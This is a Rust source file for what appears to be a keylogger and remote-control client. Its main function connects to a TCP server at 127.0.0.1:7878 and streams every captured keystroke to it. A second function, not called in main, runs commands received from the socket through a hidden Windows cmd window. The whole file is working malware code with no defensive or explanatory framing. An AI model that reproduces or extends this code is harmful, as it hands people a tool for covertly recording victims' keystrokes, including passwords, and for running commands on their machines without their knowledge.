use std::io::prelude::*;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::net::TcpStream;
use rdev::{listen, Event};

fn handle_instructions(mut stream: TcpStream) {
    let mut buf = [0; 1024];
    while let Ok(bytes) = stream.read(&mut buf[..]) {
        let command = std::str::from_utf8(&buf[..bytes]);

        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("something went bad")
        }
    }
}

fn handle_keylogger(mut stream: TcpStream) {
    let callback = move |event: Event| {
        match event.name {
            Some(string) => stream.write_all(string.as_bytes()).unwrap(),
            None => (),
        }
    };

    if let Err(error) = listen(callback) {
        println!("{:?}", error);
    }
}

fn main() {
    let stream = TcpStream::connect("127.0.0.1:7878");
    
    match stream {
        Ok(stream) => {
            handle_keylogger(stream);
        }, 
        Err(_) => println!("[ERROR] could not connect to server"),
    }
}